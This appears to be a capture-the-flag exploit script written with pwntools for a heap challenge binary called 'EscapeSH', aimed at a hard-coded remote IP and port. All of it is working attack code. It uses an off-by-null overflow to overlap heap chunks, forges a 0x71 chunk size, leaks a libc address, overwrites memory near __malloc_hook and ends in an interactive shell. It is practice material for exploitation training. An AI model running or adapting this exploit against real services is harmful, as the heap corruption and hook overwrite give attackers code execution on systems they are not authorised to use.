# -*- coding: utf-8 -*
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('EscapeSH')
p = 0
def pwn(ip,port,debug):
	global p
	if(debug == 1):
		p = process('./EscapeSH')

	else:
		p = remote(ip,port)
	
	payload = ("a"*0x30+' ')*3+'a'
	p.sendlineafter("[m$ ",payload)
	#----off-by-null
	payload = "a"*0xc0+' '
	payload +="a"*0x60+' '
	payload += "a"*0x10 +' '
	payload += "a"*0x10 +' '
	payload += "a" *0xf0+' '
	payload += "a"*0x10
	p.sendlineafter("[m$ ",payload)
	payload = "a"*0x10 +' '
	payload += "a"*0x18
	p.sendlineafter("[m$ ",payload)
	for i in range(8):
		payload = "\x11"*0x10 +' '
		payload += "\x22"*0x10+'a'*(7-i)
		p.sendlineafter("[m$ ",payload)

	payload = "a"*0x10 +' '
	payload += "\x33"*0x10+p64(0x160)
	p.sendlineafter("[m$ ",payload)
	payload = "a"*0xf0
	p.sendlineafter("[m$ ",payload)
	#----
	payload = "a"+' '
	payload += "a"+' '
	payload += "a"+' '
	payload += "a" *0x130+' '
	payload += "a"
	p.sendlineafter("[m$ ",payload)
	payload = "a"*0xf0+' '
	payload += "a"*0x130
	p.sendlineafter("[m$ ",payload)
	#----link 0x71
	for i in range(8):
		payload = "a"*0xf0+' '
		payload += "a"*0xd0+'a'*(7-i)
		p.sendlineafter("[m$ ",payload)
	for i in range(7):
		payload = "a"*0xf0+' '
		payload += "a"*0xc9+'a'*(6-i)
		p.sendlineafter("[m$ ",payload)
	payload = "a"*0xf0+' '
	payload += "a"*0xc8+p64(0x71)
	p.sendlineafter("[m$ ",payload)
	#---------
	payload = "echo "
	payload += "a"*0x60+'\x40\x01'+' '
	payload += "a"*0xf0+' '
	payload +="a"*0xc0
	p.sendlineafter("[m$ ",payload)
	libcbase_addr = u64(p.recv(6).ljust(8,"\x00"))-(0x7f86c1cafb78-0x7f86c18eb000)
	malloc_hook = libcbase_addr + (0x7f86c1cafb10-0x7f86c18eb000)
	print "libcbase_addr = ",hex(libcbase_addr)
	payload = "a"*0xf0+' '
	payload +="a"*0xd0+p64(malloc_hook- 0x23)
	p.sendlineafter("[m$ ",payload)

	for i in range(7):
		payload = "a"*0xf0+' '
		payload += "\x71"*0xc9+'a'*(6-i)
		p.sendlineafter("[m$ ",payload)
	#gdb.attach(p)
	payload = "monitor"+" "
	payload +="a"*0x60+" "
	payload +="a"*19+"monitor"+ "a"*76
	p.sendlineafter("[m$ ",payload)

	p.interactive()
if __name__ == '__main__':
	pwn('82.156.58.12',9001,0)
